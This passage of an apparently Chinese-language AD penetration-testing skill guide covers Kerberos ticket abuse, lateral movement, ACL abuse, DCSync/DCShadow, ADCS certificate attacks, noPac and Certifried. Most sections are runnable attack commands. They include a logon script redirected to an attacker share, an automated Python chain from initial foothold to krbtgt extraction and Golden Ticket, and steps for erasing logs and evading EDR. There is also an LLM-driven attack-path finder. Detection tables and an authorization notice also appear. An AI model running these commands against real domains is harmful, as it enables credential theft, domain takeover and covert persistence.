将 NTLM 哈希"升级"为 Kerberos 票据——用哈希通过 NTLM 认证获取 TGT，再用 TGT 访问 Kerberos 服务。解决 PtH 在 Kerberos 强制环境失效的问题。

```bash
# Rubeus: 用哈希请求TGT
Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /rc4:NTLM哈希 /ptt
# 获得TGT后即可Kerberos横向

# Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
  /ntlm:NTLM哈希 /run:cmd.exe
# 在新cmd中运行 klist 触发TGT获取
```

### 6.4 横向移动技术对比

| 技术 | 协议/接口 | 特征 | 隐蔽性 | 适用场景 |
|------|----------|------|--------|---------|
| PsExec | SMB+SCM | 创建服务+上传二进制 | 低(服务日志) | 经典，但有痕迹 |
| WMI | DCOM/WMI | 通过Win32_Process创建进程 | 中 | 无文件残留 |
| WinRM | HTTP(5985/5986) | 原生远程管理 | 中 | 现代默认方式 |
| DCOM | DCOM | MMC20.Application/ShellWindows | 高 | 无文件无服务 |
| Scheduled Task | SMB+AT | 创建计划任务 | 中 | 横向执行 |
| RDP | RDP(3389) | 图形会话 | 低(登录日志) | 需图形交互 |

```bash
# WMI横向 (impacket wmiexec，最常用)
wmiexec.py corp.local/Administrator:Pass@10.0.0.10
wmiexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10

# DCOM横向 (无文件，隐蔽)
# 通过MMC20.Application的ExecuteShellCommand
python3 MoveDCOM.py -t 10.0.0.10 -u Administrator -p Pass

# WinRM (PowerShell原生)
Enter-PSSession -ComputerName 10.0.0.10 -Credential corp\Administrator
# 或用哈希(需将哈希转为PSCredential)
Invoke-Command -ComputerName 10.0.0.10 -ScriptBlock {whoami} -Credential $cred

# PsExec (Sysinternals，SMB+SCM)
PsExec.exe \\10.0.0.10 -u corp\Administrator -p Pass cmd.exe
```

> **要点**：横向移动优先 WMI/DCOM(无文件残留、日志少)，避免 PsExec(创建服务日志明显)。见 `sinian-omnipotent` 域C的隐蔽信道。

---

## 7. ACL 滥用与权限提升

AD 的权限通过 ACL(Access Control List) 管理。若低权限账户对高权限对象有过宽的 ACL(如 GenericAll/ForceChangePassword)，即可借此提权。BloodHound 的核心价值正是发现这些 ACL 路径。

### 7.1 关键 ACL 权限与利用

| ACL权限 | 含义 | 利用方式 |
|---------|------|---------|
| `GenericAll` | 完全控制(读/写/删) | 改密码/改ACL/加组成员 |
| `GenericWrite` | 写所有可写属性 | 改SPN(Kerberoasting)/改scriptPath(登录执行) |
| `WriteDacl` | 可改ACL | 给自己加GenericAll |
| `WriteOwner` | 可改所有者 | 改所有者为→自己→改ACL→GenericAll |
| `ForceChangePassword` | 可强制改密码 | 重置目标密码直接登录 |
| `Self` (Self-Membership) | 可加自己到组 | 加入Domain Admins |
| `WriteProperty` (Member) | 可改组成员 | 加任意账户到组 |

### 7.2 GenericAll 提权

对目标用户有 GenericAll 即可改其密码：

```powershell
# PowerView 改密码
Set-DomainUserPassword -Identity targetuser -AccountPassword $(ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# 或加自己到目标所在的高权限组
net group "Domain Admins" lowpriv /add /domain
# 若对Domain Admins组有GenericAll/Self-MembersHIP
```

### 7.3 GenericWrite 利用

```powershell
# 1. 改SPN触发Kerberoasting(对用户有GenericWrite)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/SPN'}
# 然后Kerberoasting该用户(见§3.3)

# 2. 改scriptPath(登录时执行脚本，需用户重新登录)
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\evil.bat'}

# 3. 改msDS-AllowedToActOnBehalfOfOtherIdentity(触发RBCD，见§4.6)
```

### 7.4 DCSync

DCSync 是**无需登录域控即可拉取任意账户哈希**的攻击——通过 DRSUAPI(目录复制服务)协议模拟域控的复制请求，DC 会把账户哈希(含 krbtgt)发送过来。只需对域有 `GetChanges` + `GetChangesAll` 权限(通常是 Domain Admins/DC/Replication 权限)。

```bash
# 1. 检查是否有DCSync权限(BloodHound: Find Principals with DCSync Rights)
# 通常是Domain Admins、Domain Controllers、Enterprise DCs组成员
# 或显式被授予Replicating Directory Changes权限

# 2. 拉取krbtgt哈希 (mimikatz)
mimikatz # lsadump::dcsync /user:corp\krbtgt

# 3. 拉取指定用户哈希
mimikatz # lsadump::dcsync /user:corp\Administrator

# 4. 拉取全域哈希 (impacket secretsdump)
secretsdump.py corp.local/Administrator:Pass@10.0.0.1 -just-dc
# -just-dc 仅域哈希(NTDS)，不含本地
secretsdump.py corp.local/user:Pass@dc01 -just-dc-ntlm      # 仅NTLM哈希
```

> **要点**：DCSync 是从普通域权限到全域控制的关键一跃——拿到 krbtgt 哈希即可铸 Golden Ticket 持久化。防御：监控 DRSUAPI(ID 4662，含 1131f6aa/1131f6ad 复制权限)的非 DC 账户调用。

### 7.5 DCShadow

DCShadow 是 DCSync 的"反向"——攻击者**注册一个伪造的域控**，向真实 DC 推送伪造的目录变更(如修改某账户的 memberOf/特权)。与 DCSync 拉取数据不同，DCShadow 推送数据，可静默修改域对象而不留标准审计日志(因为变更看似来自合法DC)。

```bash
# 1. 需Domain Admin权限，且需在DC注册SPN(伪装为DC) + 修改配置
# Mimikatz DCShadow
mimikatz # !+
mimikatz # !processtoken                       # 提升到SYSTEM
# 注册伪造DC (需对Configuration命名空间写权限)
mimikatz # lsadump::dcshadow /object:CN=targetuser /attribute:primaryGroupID /value:512
# 把targetuser的primaryGroupID改为512(Domain Admins)

# 2. 触发复制推送
mimikatz # lsadump::dcshadow /push

# 3. 清理(注销伪造DC)
mimikatz # !-
```

**DCSync vs DCShadow**：

| 维度 | DCSync | DCShadow |
|------|--------|----------|
| 方向 | 拉取(读) | 推送(写) |
| 用途 | 获取哈希 | 修改域对象 |
| 审计 | 有4662日志 | 变更看似合法DC，难检测 |
| 权限 | Replication权限 | DA + 配置写权限 |
| 持久化 | Golden Ticket | 静默提权/植入后门属性 |

---

## 8. ADCS 证书服务攻击

Active Directory Certificate Services (ADCS) 是微软的 PKI 实现，2021 年 SpecterOps 的"Certi"研究揭示了 ADCS 的庞大攻击面——错误配置的证书模板(ESC1-8)可导致从普通域用户直接提权到域管。这是 2021-2026 AD 渗透的重点领域。

### 8.1 ESC1 — 错误模板的证书申请

最常见且致命的 ESC。当证书模板满足：①允许低权限用户申请；②指定申请者可填入 Subject Alternative Name (SAN)；③模板用途包含客户端认证(Client Authentication)；④颁发CA已发布——攻击者可申请一张**任意用户身份**的证书，用该证书 Kerberos 认证即冒充该用户(含域管)。

```bash
# 1. 枚举脆弱模板 (certify)
certify.exe find /vulnerable                    # 列出所有ESC脆弱模板
# 或 BloodHound 的 ADCS 数据 (SharpHound -c All 含证书)

# 2. 申请证书，SAN填Administrator
certify.exe request /ca:corp-CA-01\corp-CA /template:VulnTemplate \
  /altname:Administrator
# 输出 base64 证书

# 3. 转换为PKCS12并PKINIT认证
# 将base64保存为cert.pem，转换
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx -pass pass:Pass123!

# 4. 用证书获取Administrator的TGT (Rubeus)
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:Pass123! /ptt
# 或 PKINITtools (Linux)
gettgtpkinit.py corp.local/Administrator -cert-pfx cert.pfx -pfx-pass Pass123! admin.ccache

# 5. DCSync接管
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

### 8.2 ESC2-8 概览

| ESC | 漏洞 | 利用 |
|-----|------|------|
| ESC1 | 模板允许任意SAN+客户端认证 | 申请任意身份证书→冒充域管 |
| ESC2 | 模板允许任意用途(Any Purpose) | 可作ESC1用，也可签署其他证书 |
| ESC3 | 模板1允许申请"证书申请代理"证书 | 用代理证书代他人申请任意模板 |
| ESC4 | 对模板对象有GenericAll | 修改模板配置为ESC1 |
| ESC5 | 对CA/容器有过宽ACL | 修改CA配置/启用新模板 |
| ESC6 | CA未启用ENFORCEKERBEROSPREAUTH(EDITF_ATTRIBUTESUBJECTALTNAME2) | 任意模板都可填SAN |
| ESC7 | 对CA有ManageCA权限 | 启用模板/修改CA配置 |
| ESC8 | ADCS HTTP接口可NTLM中继 | PetitPotam→ADCS(见§5.5) |

```bash
# ESC3 证书申请代理
# 1. 申请一张"证书申请代理"证书(Enrollment Agent模板)
certify.exe request /ca:corp-CA /template:EnrollmentAgent
# 2. 用代理证书代Administrator申请客户端认证证书
certify.exe request /ca:corp-CA /template:UserAuthentication /onbehalfof:corp\\Administrator \
  /enrollcert:agent.pfx /enrollcertpw:Pass
```

### 8.3 Shadow Credentials

Shadow Credentials 是 RBCD 的"证书版"——若对目标有 `GenericWrite`/`GenericAll`，可在目标的 `msDS-KeyCredentialLink` 属性写入攻击者控制的证书公钥，之后用证书(私钥)以该目标身份进行 PKINIT Kerberos 认证，获取其 TGT。

```bash
# 1. 对目标有GenericWrite → 写入KeyCredentialLink (Whisker)
Whisker.exe add /target:targetuser /domain:corp.local
# 输出证书PFX

# 2. 用证书PKINIT认证获取targetuser的TGT
Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:Pass /ptt

# 或用 pywhisker (Linux)
python3 pywhisker.py -d corp.local -u attacker -p Pass --target targetuser --action add
python3 PKINITtools.py corp.local/targetuser -cert-pfx cert.pfx ...
```

> **要点**：Shadow Credentials 是 2021 年后替代 RBCD 的隐蔽提权——无需新建机器账户，直接对目标写证书属性即可。若目标是 DC$ 则直接获 DC 身份→DCSync。防御：监控 msDS-KeyCredentialLink 的非预期写入。

---

## 9. 2026 最新技术与对抗演进

AD 安全对抗持续演进，微软每月补丁与研究者新发现不断。本节覆盖 2022-2026 的关键新技术。

### 9.1 noPac (CVE-2021-42278 + CVE-2021-42287)

2021年底爆发的"组合拳"——普通域用户即可提权到域管。原理：①CVE-2021-42278 允许机器账户名去除 `$` 后缀(SAMName 不一致)；②CVE-2021-42287 在请求 TGS 时若账户不存在则用 PAC 中的账户名重新查询。攻击者将机器账户改名后删除，再请求 TGT，DC 在 PAC 校验时查到的是改名后的高权限账户。

```bash
# noPac 攻击链 (noPac.py)
python3 noPac.py corp.local/user:Pass -dc-ip 10.0.0.1 -use-ldap
# 1. 加机器账户 → 改名去掉$ → 请求TGT → 删除账户
# 2. 用TGT请求TGS → DC用PAC账户名重查 → 命中改名后的(已删除)账户名
# 3. 获得Administrator的TGS → DCSync
# 结果: 普通域用户直接DCSync
```

### 9.2 KrbRelayUp

2022年的本地提权技术——在非域控的域成员主机上，利用 NTLM 中继(到本地LDAP/ncacn) + RBCD 组合，将普通域用户提权到本地 SYSTEM。无需域管权限，仅需一个普通域账户。

```bash
# KrbRelayUp
KrbRelayUp.exe -relay -Domain corp.local -CreateNew -clsid <CLSID>
# 1. 中继自身NTLM到本地LDAP
# 2. 设置RBCD(让当前机器账户可委派到自己)
# 3. S4U以SYSTEM身份访问本地 → 本地提权
```

### 9.3 CVE-2022-26923 — certifried

2022年 ADCS 提权——普通域用户通过修改计算机账户的 `dnsHostName` 属性为域控主机名(因计算机账户默认可改自身dnsHostName)，申请证书时 ADCS 用 dnsHostName 作为 SAN，从而获得域控身份的证书。

```bash
# 1. 新建机器账户(或用现有可控)
# 2. 修改其dnsHostName为DC的FQDN(机器账户默认对自己有GenericWrite)
Set-DomainObject -Identity evil$ -Set @{"dNSHostName"="dc01.corp.local"}
# 3. 用evil$申请机器证书 → SAN=dc01.corp.local
certify.exe request /ca:corp-CA /template:Machine /machine
# 4. 用证书PKINIT → 获得DC$身份的TGT → DCSync
```

### 9.4 2024-2026 新型攻击与防御对抗

| 技术/漏洞 | 年份 | 原理 | 影响 |
|----------|------|------|------|
| KerberosBronzeBit (CVE-2020-17049) | 2020 | S4U2Proxy转发热降低权限校验，可绕过委派限制 | 扩展委派攻击面 |
| samAccountName spoofing | 2021 | noPac基础 | 普通用户→DA |
| ADCS ESC1-15 | 2021-2023 | 持续发现的证书模板误配置 | 普通用户→DA |
| KrbRelayUp | 2022 | 本地NTLM中继+RBCD | 本地提权到SYSTEM |
| Certifried | 2022 | dnsHostName欺骗获取DC证书 | 普通用户→DC |
| Kerberos PKINIT 弱点 | 2023 | 证书认证的边缘case | 票据伪造 |
| LDAP Relay to LDAPS | 2023 | LDAPS未强制Channel Binding | 中继到LDAPS提权 |
| ADCS HTTP Interface Abuse | 2024 | 持续的HTTP接口中继变体 | 无凭据→DC |
| **2026 AI辅助BloodHound路径分析** | 2026 | LLM分析攻击图，发现人工难察觉的多跳提权路径 | 加速路径发现 |
| **2026 EDR规避横向移动** | 2026 | 用合法工具(如WMI事件订阅)替代PsExec，规避行为检测 | 隐蔽横向 |
| **2026 Kerberos票据异常检测对抗** | 2026 | Diamond/Sapphire配合时效伪装，规避PAC与时效检测 | 隐蔽持久化 |

### 9.5 2026 AI 辅助 AD 攻击路径发现

传统 BloodHound 依赖预置查询找最短路径，但企业级域环境攻击图极为复杂，存在大量人工难发现的多跳路径。2026 年出现 LLM 驱动的攻击图分析：

```python
# 概念: 将BloodHound图数据喂给LLM，发现隐蔽多跳提权路径
import json

class AIAttackPathFinder:
    """LLM驱动的AD攻击路径发现"""
    def __init__(self, bloodhound_json, current_user):
        self.graph = bloodhound_json    # BloodHound导出的节点与边
        self.start = current_user
        self.target = "DOMAIN ADMINS@CORP.LOCAL"
    
    def find_novel_paths(self):
        # 1. 提取当前用户可达的所有节点与边
        reachable = self._bfs_reachable(self.start)
        # 2. 构造LLM提示: 给出可达子图，要求发现非显而易见的提权链
        prompt = self._build_prompt(reachable)
        # 3. LLM分析: 综合ACL/委派/会话/ADCS，发现多跳组合路径
        # 例如: GenericWrite改SPN→Kerberoasting→拿到服务账户→该账户对某DC有DCSync
        return llm_analyze(prompt)
```

---

## 10. 检测与防御

### 10.1 关键攻击的检测信号

| 攻击 | 关键日志/事件ID | 检测特征 |
|------|----------------|---------|
| Kerberoasting | 4769 (TGS请求) | 单用户短时间内请求大量TGS + RC4-HMAC加密 |
| AS-REP Roasting | 4768 (TGT请求) | 无预认证的TGT请求(异常) |
| Pass-the-Hash | 4624 (登录) | 登录类型3(网络)+无4648(明文) |
| Golden Ticket | 4769/4768 | 票据有效期异常长/异常SID History/PAC异常 |
| DCSync | 4662 (目录访问) | 非DC账户调用复制权限(1131f6aa/1131f6ad) |
| DCShadow | 4662 + 5137 | 新DC注册+配置命名空间修改 |
| NTLM Relay | 4624 + 4776 | 同源认证跨多目标/异常认证源 |
| ADCS ESC | 4886/4887 (证书) | 异常证书申请+非预期SAN |
| RBCD | 4662/5136 | msDS-AllowedToActOnBehalfOfOtherIdentity 修改 |
| PetitPotam | 4624 | DC向异常主机发起认证 |

### 10.2 纵深防御矩阵

| 防御层 | 措施 | 防御攻击 |
|--------|------|---------|
| 协议层 | 强制SMB签名 + LDAP签名 + Channel Binding(EPA) | NTLM Relay |
| 认证层 | 禁用NTLM(仅Kerberos) + 启用PAC签名校验 | PtH/Golden Ticket |
| 账户层 | 所有账户启用预认证 + 服务账户用gMSA + 强密码 | AS-REP/Kerberoasting |
| 委派层 | 关闭非约束委派 + 启用PAE(Protected Users) | 委派攻击 |
| PKI层 | 审计证书模板 + 关闭ADCS HTTP接口 + 安全模板设计 | ADCS ESC1-8 |
| 权限层 | 收敛ACL(Tier模型) + 限制MachineAccountQuota | ACL滥用/RBCD |
| 监控层 | 部署EDR + SOC关联4769/4662/4887 | 全域攻击检测 |
| 凭据层 | krbtgt定期双轮换 + LAPS管理本地管理员密码 | Golden Ticket/横向 |
| 网络层 | 分区(Tier 0 DC/Tier 1服务器/Tier 2工作站) | 横向移动 |

### 10.3 Tier 管理模型

微软推荐的分层模型，限制凭据跨层流动：

```
Tier 0 (域控)    — DC/AD/CA/虚拟化宿主  — 绝不登录Tier1/2
Tier 1 (服务器)   — 应用/数据库服务器      — 绝不登录Tier2
Tier 2 (工作站)   — 用户终端              — 可登录任意，但管理员凭据不进入
```

**核心原则**：高Tier的管理员凭据**绝不**在低Tier主机上输入(否则被LSASS提取)。这是阻断"从工作站横向到DC"的根本防御。

---

## 11. 自动化工具链与实战 SOP

### 11.1 工具速查表

| 阶段 | 工具 | 用途 |
|------|------|------|
| 侦察 | BloodHound/SharpHound | 攻击图分析 |
| 侦察 | PowerView/ADModule | 命令行枚举 |
| 侦察 | PingCastle | 域安全评估报告 |
| 凭据 | Impacket (GetNPUsers/GetUserSPNs/secretsdump) | AS-REP/Kerberoasting/哈希提取 |
| 凭据 | Rubeus | Kerberos攻击全套(Windows内) |
| 凭据 | Mimikatz | LSASS dump/票据/DCSync |
| 凭据 | lsassy/nanodump/pypykatz | 免杀dump与解析 |
| 中继 | ntlmrelayx/responder | NTLM中继与诱导 |
| 中继 | PetitPotam/Coercer | 强制认证触发 |
| ADCS | Certify/certipy/pywhisker | 证书模板枚举与攻击 |
| 横向 | Impacket (psexec/wmiexec/smbexec) | 远程执行 |
| 横向 | NetExec (原CrackMapExec) | 批量扫描与执行 |
| 提权 | Whisker/ShadowSpray | Shadow Credentials |
| 综合 | BloodHound+Rubeus+Impacket | 标准组合 |

### 11.2 实战 SOP：从外网到域控

```text
[阶段0] 初始立足
  └─ 外网漏洞/钓鱼获得一台域内主机shell
       └─ whoami /all + klist + 判断域 (§1.3)

[阶段1] 侦察 (§2)
  ├─ 上传SharpHound采集 → BloodHound分析最短路径
  ├─ PowerView枚举高价值账户/委派/ACL
  └─ 定位: 域管在哪登录(HasSession)/可Kerberoasting账户/ESC模板

[阶段2] 凭据获取 (§3)
  ├─ 无凭据: AS-REP Roasting + 密码喷洒
  ├─ 有普通用户: Kerberoasting
  └─ 有主机管理: LSASS dump提取凭据

[阶段3] 横向与提权 (§4-8)
  ├─ PtH/PtT/Overpass-the-Hash 横向到更多主机 (§6)
  ├─ BloodHound路径执行: ACL滥用/委派攻击 (§4.6/§7)
  ├─ NTLM Relay (PetitPotam触发) (§5)
  └─ ADCS ESC攻击 (§8)

[阶段4] 域控接管
  ├─ DCSync拉取krbtgt (§7.4)
  ├─ 或 PetitPotam+ADCS 链 (§5.5)
  └─ 或 2026新技术 noPac/Certifried (§9)

[阶段5] 持久化
  ├─ Golden/Diamond/Sapphire Ticket (§4.2/4.4/4.5)
  ├─ DCShadow静默植入 (§7.5)
  └─ Shadow Credentials后门 (§8.3)

[阶段6] 清理与报告
  ├─ 清除工具与日志痕迹
  └─ 生成攻击路径报告与修复建议
```

### 11.3 自动化域渗透编排示例

```python
#!/usr/bin/env python3
"""思念AD自动化渗透编排 — 从立足点到域控的自动攻击链"""
import subprocess
from dataclasses import dataclass
from typing import List

@dataclass
class ADCampaign:
    domain: str
    dc_ip: str
    initial_user: str
    initial_pass: str
    hashes: dict = None
    tickets: list = None

class SinianADOrchestrator:
    """思念AD攻击编排器 — 自动化执行侦察→凭据→提权→DC接管"""
    
    def __init__(self, campaign: ADCampaign):
        self.c = campaign
        self.recon = {}
        self.creds = {}
    
    def run_full_chain(self):
        print(f"[*] 思念AD编排器启动 — 目标域: {self.c.domain}")
        self._phase_recon()        # 侦察
        self._phase_credsteal()    # 凭据获取
        self._phase_privesc()      # 提权
        self._phase_dctakeover()   # DC接管
        self._phase_persist()      # 持久化
        return self._report()
    
    def _phase_recon(self):
        """侦察: Kerberoasting候选 + AS-REP候选 + ADCS模板"""
        print("[*] 阶段1: 域侦察")
        # AS-REP Roasting (无需凭据增强)
        r = subprocess.run(
            ["GetNPUsers.py", f"{self.c.domain}/", "-no-pass",
             "-dc-ip", self.c.dc_ip],
            capture_output=True, text=True)
        self.recon['asrep_candidates'] = r.stdout
        # Kerberoasting候选 (用初始凭据)
        r = subprocess.run(
            ["GetUserSPNs.py", f"{self.c.domain}/{self.c.initial_user}:{self.c.initial_pass}",
             "-dc-ip", self.c.dc_ip, "-request"],
            capture_output=True, text=True)
        self.recon['kerberoast_hashes'] = r.stdout
    
    def _phase_credsteal(self):
        """凭据获取: 爆破Kerberoasting哈希"""
        print("[*] 阶段2: 凭据获取与爆破")
        if self.recon.get('kerberoast_hashes'):
            # 写入文件供hashcat爆破
            with open('/tmp/tgs.txt', 'w') as f:
                f.write(self.recon['kerberoast_hashes'])
            # 实战中调用hashcat (此处省略)
    
    def _phase_privesc(self):
        """提权: 检查DCSync权限/ADCS"""
        print("[*] 阶段3: 提权路径探测")
        # 若初始账户有DCSync权限则直接拉取
        r = subprocess.run(
            ["secretsdump.py", f"{self.c.domain}/{self.c.initial_user}:{self.c.initial_pass}",
             "-just-dc", f"@{self.c.dc_ip}"],
            capture_output=True, text=True)
        if 'krbtgt' in r.stdout:
            self.creds['krbtgt'] = self._extract_hash(r.stdout, 'krbtgt')
            print("[+] DCSync成功，已获取krbtgt哈希")
    
    def _phase_dctakeover(self):
        """DC接管: 用krbtgt铸Golden Ticket"""
        if self.creds.get('krbtgt'):
            print("[*] 阶段4: Golden Ticket持久化")
            # ticketer.py 铸造 (此处省略详细参数)
    
    def _phase_persist(self):
        print("[*] 阶段5: 持久化完成")
    
    def _extract_hash(self, output, user):
        for line in output.splitlines():
            if line.lower().startswith(user.lower()):
                return line.split(':')[1] if ':' in line else line
        return None
    
    def _report(self):
        return {"domain": self.c.domain, "creds": list(self.creds.keys()),
                "recon": list(self.recon.keys())}

if __name__ == '__main__':
    c = ADCampaign(domain="corp.local", dc_ip="10.0.0.1",
                   initial_user="user", initial_pass="Pass123!")
    orch = SinianADOrchestrator(c)
    print(orch.run_full_chain())
```

---

## 12. 注意事项

- **授权边界**：所有 AD 攻击仅在书面授权的渗透测试范围内进行，禁止对非授权域环境操作
- **日志与清理**：AD 攻击产生大量日志(4624/4662/4769/4887)，测试需告知客户监控团队，避免误判为真实攻击
- **凭据安全**：测试中获取的哈希/票据/密码须加密存储、测试后销毁，禁止留存
- **域控操作风险**：DCShadow/DCSync/改密码等写操作可能影响域稳定性，生产环境慎用，优先只读侦察
- **补丁状态**：2026 大量环境已修补 noPac/Certifried，但 ADCS ESC 与 ACL 滥用仍是普遍问题，需结合 BloodHound 实际分析
- **与免杀联动**：LSASS dump/横向移动工具受 EDR 监控，实际操作需结合 `sinian-omnipotent` 域A免杀技术规避
- **跨域/跨林**：本技能聚焦单域，跨域/跨林信任攻击(SID History 注入/External Trust 滥用)需额外分析 SID Filtering 配置

